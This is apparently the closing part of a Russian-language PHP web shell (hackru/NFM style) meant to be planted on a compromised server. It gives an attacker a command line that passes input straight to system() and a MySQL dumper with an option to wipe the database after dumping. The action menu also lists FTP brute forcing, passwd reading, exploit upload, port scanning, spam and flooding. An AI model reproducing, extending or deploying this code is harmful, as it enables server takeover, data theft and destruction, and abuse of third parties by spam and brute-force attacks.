  echo "<br><center>Все данные в этих таблицах:<br> ".$tblsv." помещены в файл указанный ниже:<br><br></center><table border='0' align='center' cellpadding='0' cellspacing='0'><col width=1 bgcolor='#2D7DA7'><col valign=center><col width=1 bgcolor='#2D7DA7'><col valign=center align=right><col width=1 bgcolor='#2D7DA7'><tr><td bgcolor='#2D7DA7' colspan=5></td></tr><tr><td></td><td bgcolor='#338CBD' align=center class=texte><font size=1><b>Файл</b></font></td><td></td><td bgcolor='#338CBD' align=center class=texte><font size=1><b>Размер</b></font></td><td></td></tr><tr><td bgcolor='#2D7DA7' colspan=5></td></tr>";
  reset($f_nm);
  while (list($i,$val)=each($f_nm)) {
   $coul='#99CCCC';
   if ($i % 2) { $coul='#CFE3E3'; }
   echo "<tr><td></td><td bgcolor=".$coul." class=texte>&nbsp;<a href='".$val."' class=link target='_blank'>".$val."&nbsp;</a></td><td></td>";
   $fz_tmp=filesize($val);
   if ($fcut && ($fz_tmp > $max_sql)) {
    echo "<td bgcolor=".$coul." class=texte>&nbsp;<font size=1 color=red>".$fz_tmp." Octets</font>&nbsp;</td><td></td></tr>";
   } else {
    echo "<td bgcolor=".$coul." class=texte>&nbsp;<font size=1>".$fz_tmp." байт</font>&nbsp;</td><td></td></tr>";
   }
   echo "<tr><td bgcolor='#2D7DA7' colspan=5></td></tr>";
  }
  echo "</table><br>";
  echo $footer;exit;
 }

 if ($sqlaction=='connect') { 
  if(!@mysql_connect($dbhost,$dbuser,$dbpass)) { 
   echo $header."<br><center><font color=red><b>Подключение не возможно! Проверьте правильно ли введены данные!</b></font></center>\n$footer";
   exit;
  }
 
  if(!@mysql_select_db($dbbase)) { 
   echo $header."<br><center><font color=red><<b>Подключение не возможно! Проверьте правельно ли введины данные!</b></font></center>\n$footer";
   exit;
  }

  if ($secu==1) {
   if (!file_exists($secu_config)) {
    $fp=fopen($secu_config,"w");
    fputs($fp,"<?php\n");
    fputs($fp,"\$dbhost='$dbhost';\n");
    fputs($fp,"\$dbbase='$dbbase';\n");
    fputs($fp,"\$dbuser='$dbuser';\n");
    fputs($fp,"\$dbpass='$dbpass';\n");
    fputs($fp,"?>");
    fclose($fp);
   }
   include($secu_config);
  } else {
   if (file_exists($secu_config)) { unlink($secu_config); }
  }

  mysql_connect($dbhost,$dbuser,$dbpass);
  $tables=mysql_list_tables($dbbase);
  $nb_tbl=mysql_num_rows($tables);

  echo $header."<script language='javascript'> function checkall() { var i=0;while (i < $nb_tbl) { a='tbls['+i+']';document.formu.elements[a].checked=true;i=i+1;} } function decheckall() { var i=0;while (i < $nb_tbl) { a='tbls['+i+']';document.formu.elements[a].checked=false;i=i+1;} } </script><center><br><b>Выбирите нужные вам таблицы для дампинга!</b><form action='' method='post' name=formu><input type='hidden' name='sqlaction' value='save'><input type='hidden' name='dbhost' value='$dbhost'><input type='hidden' name='dbbase' value='$dbbase'><input type='hidden' name='dbuser' value='$dbuser'><input type='hidden' name='dbpass' value='$dbpass'><DIV ID='infobull'></DIV><table border='0' width='400' align='center' cellpadding='0' cellspacing='0' class=texte><col width=1 bgcolor='#2D7DA7'><col width=30 align=center valign=center><col width=1 bgcolor='#2D7DA7'><col width=350> <col width=1 bgcolor='#2D7DA7'><tr><td bgcolor='#2D7DA7' colspan=5></td></tr><tr><td></td><td bgcolor='#336699'><input type='checkbox' name='selc' alt='Выделить всё' onclick='if (document.formu.selc.checked==true){checkall();}else{decheckall();}')\"></td><td></td><td bgcolor='#338CBD' align=center><B>Названия таблиц</b></td><td></td></tr><tr><td bgcolor='#2D7DA7' colspan=5></td></tr>";

  $i=0;
  while ($i < mysql_num_rows ($tables)) {
   $coul='#99CCCC';
   if ($i % 2) { $coul='#CFE3E3';}
   $tb_nom=mysql_tablename ($tables,$i);
   echo "<tr><td></td><td bgcolor='".$coul."'><input type='checkbox' name='tbls[".$i."]' value='".$tb_nom."'></td><td></td><td bgcolor='".$coul."'>&nbsp;&nbsp;&nbsp;".$tb_nom."</td><td></td></tr><tr><td bgcolor='#2D7DA7' colspan=5></td></tr>";
   $i++;
  }

  mysql_close();
  echo "</table><br><br><table align=center border=0><tr><td align=left class=texte> <hr> <input type='radio' name='savmode' value='csv'> 
  Сохранить в формате csv (*.<i>csv</i>)<br> <input type='radio' name='savmode' value='sql' checked> 
  Сохранить в формате Sql (*.<i>sql</i>)<br> <hr> <input type='radio' name='opt' value='1' checked>
  Сохранить структуру и данные<br> <input type='radio' name='opt' value='2'>
  Сохранить только структуру<br> <input type='radio' name='opt' value='3'>
  Сохранить только данные<br> <hr> <input type='Checkbox' name='drp_tbl' value='1' checked>
  Перезаписывать файл, если существует<br>  <input type='Checkbox' name='ecraz' value='1' checked>
  Очистить базу после создания дампа<br> <input type='Checkbox' name='f_tbl' value='1'> 
  Помещать каждую таблицу в отдельный файл<br> <input type='Checkbox' name='f_cut' value='1'>
  Максимальный размер одного дамп-файла: <input type='text' name='max_sql' value='200000' class=form>
  Octets<br> <input type='Checkbox' name='file_type' value='1'>
  Gzip.<br> 
  </td></tr></table><br><br><input type='submit' value=' Задампить:) ' class=form></form></center>$footer";
  exit;
 }

// SQL actions END

 if(file_exists($secu_config)) {
  include ($secu_config);
  $ck="checked";
 } else {
  $dbhost="localhost";
  $dbbase="";
  $dbuser="root";
  $dbpass="";
  $ck="";
 }
 
 echo $header."
<table width=620 cellpadding=0 cellspacing=0 align=center> 
 <col width=1> 
 <col width=600> 
 <col width=1> 
 <tr>
  <td></td>
  <td align=left class=texte>
   <br>
   <form action='' method='post'>
   <input type='hidden' name='sqlaction' value='connect'> 
   <table border=0 align=center> 
    <col> 
    <col align=left> 
    <tr>
     <td colspan=2 align=center style='font:bold 9pt;font-family:verdana;'>Введите данные для подключению к mySQL серверу!<br><br></td> 
    </tr> 
    <tr>
     <td class=texte>Адрес сервера:</td> 
     <td><INPUT TYPE='TEXT' NAME='dbhost' SIZE='30' VALUE='localhost' class=form></td>
    </tr> 
    <tr>
     <td class=texte>Название базы:</td> 
     <td><INPUT TYPE='TEXT' NAME='dbbase' SIZE='30' VALUE='' class=form></td> 
    </tr> 
    <tr>
     <td class=texte>Логин:</td> 
     <td><INPUT TYPE='TEXT' NAME='dbuser' SIZE='30' VALUE='root' class=form></td> 
    </tr> 
    <tr>
     <td class=texte>Пароль</td> 
     <td><INPUT TYPE='Password' NAME='dbpass' SIZE='30' VALUE='' class=form></td> 
    </tr> 
   </table> 
   <br> <center> <br><br> 
   <input type='submit' value=' Подключится ' class=form></center> </form> <br><br> 
  </td> 
  <td></td> 
 </tr> 
 <tr> 
  <td height=1 colspan=3></td> 
 </tr> 
</table>
</center>";

}
// SQL END

/* main() */
set_time_limit(0);

if ( $action !="download") print("$HTML");

if (!isset($cm)) {
 if (!isset($action)) {
  if (!isset($tm)) { $tm = getcwd(); }
  $curdir = getcwd();
  if (!@chdir($tm)) exit("<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td align=center class=alert>Нет доступа к дериктории, смотри CHMOD.</td></tr></table>");
  getdir();
  chdir($curdir);
  $supsub = $gdir[$j-1];
  if (!isset($tm) ) { $tm=getcwd();}
  readdirdata($tm);
 } else {
  switch ($action) {
   case "view":
    viewfile($tm,$fi);
    break;
   case "delete":
    echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td><center><font color='#FFFFCC' face='Tahoma' size = 2>Файл <b>$fi</b> успешно удален.</font></center></td></tr></table>";
    deletef($tm);
    break;
   case "download":
   if (isset($fatt) && strlen($fatt)>0) {
    $attach=$fatt; 
    header("Content-type: text/plain"); 
   } 
   else {
    $attach=$fi;
    header("Content-type: hackru"); 
   }
   header("Content-disposition: attachment; filename=\"$attach\";"); 
   readfile($tm."/".$fi);
   break;
   case "download_mail":
   download_mail($tm,$fi);
   break;
   case "edit":
   editfile($tm,$fi);
   break;
  case "save":
   savefile($tm,$fi);
   break;
  case "uploadd":
   uploadtem();
   break;
  case "up":
   up($tm);
   break;
  case "newdir":
   newdir($tm);
   break;
  case "createdir":
   cdir($tm);
   break;
  case "deldir":
   deldir();
   break;
  case "feedback":
   mailsystem();
   break;
  case "upload":
   upload();
   break;
  case "help":
   help();
   break;
  case "ftp":
   ftp();
   break;
  case "portscan":
   portscan();
   break;
  case "sql":
   sql();
   break; 
  case "tar":
   tar();
   break; 
  case "bash":
   bash();
   break; 
  case "passwd":
   passwd();
   break; 
  case "exploits":
   exploits($dir);
   break;
  case "upload_exploits":
   upload_exploits($dir);
   break; 
  case "upload_exploitsp":
   upload_exploitsp($dir);
   break; 
  case "arhiv":
   arhiv($tm,$pass);
   break; 
  case "crypte":
   crypte();
   break;
  case "decrypte":
   decrypte();
   break;  
  case "brut_ftp":
   brut_ftp();
   break; 
  case "copyfile":
   copyfile($tm,$fi);
   break; 
  case "down":
   down($dir);
   break;
  case "downfiles":
   downfiles($dir);
   break; 
  case "spam":
   spam();
   break; 
   case "flud":
   flud();
   break; 
  case "spam1":
   spam1($file);
   break; 
  case "del":
   del();
   break; 
  }
 }
} else {
 echo "<br><table CELLPADDING=0 CELLSPACING=0 bgcolor=#FFFFFF BORDER=1 width=600 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td><center>Выполено: $cm</center><pre>";
 echo system($cm);
 echo "</pre></td></tr></table>";
}

if ($action !="download" && $action != "flud" && $action != "down" && $action != "del" && $action != "spam1" && $action != "spam" && $action != "brut_ftp" && $action != "download_mail" && $action != "copyfile" && $action != "crypte" && $action != "decrypte" && $action != "exploits" && $action != "arhiv" && $action != "download_mail2" && $action != "feedback" && $action != "uploadd"  && $action != "newdir" && $action != "edit" && $action != "view" && $action != "help" && $action != "ftp" && $action != "portscan" && $action != "sql" && $action != "tar"  && $action != "bash" && $action != "anonimmail") {
 echo "<br><TABLE CELLPADDING=0 CELLSPACING=0 width='600' bgcolor=#184984 BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><form method='get' action='$PHP_SELF'><tr><td align=center colspan=2 class=pagetitle><b>Командная строка:</b></td></tr><tr><td valign=top><input type=text name=cm size=90 class='inputbox'></td><td valign=top><input type=submit value='Дави' class=button1 $style_button></td></tr></form></table>";
 $perdir = @permissions(fileperms($tm));
 if ($perdir && $perdir[7] == "w" && isset($tm)) uploadtem();
 else echo "<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td align=center class=pagetitle><b>Не могу загружать файлы в этой дериктории</b></font></td></tr></table>";
 if ($perdir[7] == "w" && isset($tm)) {
  echo "<TABLE CELLPADDING=0 CELLSPACING=0 width='600' bgcolor=#184984 BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><form method = 'POST' action = '$PHP_SELF?tm=$tm&action=createdir'><tr><td align=center colspan=2 class=pagetitle><b>Создать каталог:</b></td></tr><tr><td valign=top><input type=text name='newd' size=90 class='inputbox'></td><td valign=top><input type=submit value='Дави' class=button1 $style_button></td></tr></form></table>";
 } else {
  echo "<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#184984 BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><tr><td align=center class=pagetitle><b>Не могу создать папку в этой дериктории</b></td></tr></table>";
 }
}

if ($action !="download" && $action != "flud" && $action != "down" && $action != "del" && $action != "spam" && $action != "spam1" && $action != "brut_ftp" && $action != "download_mail" && $action != "copyfile" && $action != "crypte" && $action != "decrypte" && $action != "exploits" && $action != "arhiv" && $action != "download_mail2" && $action != "feedback" && $action != "uploadd"  && $action != "newdir" && $action != "edit" && $action != "view" && $action != "help" && $action != "aliases" && $action != "portscan" && $action != "ftp" && $action != "sql" && $action != "tar" && $action != "bash" && $action != "anonimmail") {
 echo "<TABLE CELLPADDING=0 CELLSPACING=0 width='600' bgcolor=#184984 BORDER=1 align=center bordercolor=#808080 bordercolorlight=black bordercolordark=white><form method='get' action='$PHP_SELF'><tr><td align=center colspan=2 class=pagetitle><b>Готовые запросы к Unix серверу:</b></td></tr><tr><td valign=top width=95%><select name=cm class='inputbox'>";
 foreach ($aliases as $alias_name=>$alias_cmd) echo "<option size=80 class='inputbox'>$alias_name</option>";
 echo "</select></td><td valign=top align=right width=5%><input type=submit value='Дави' class=button1 $style_button></td></tr></table></form>";
}

if ( $action !="download") echo nfm_copyright();
?>
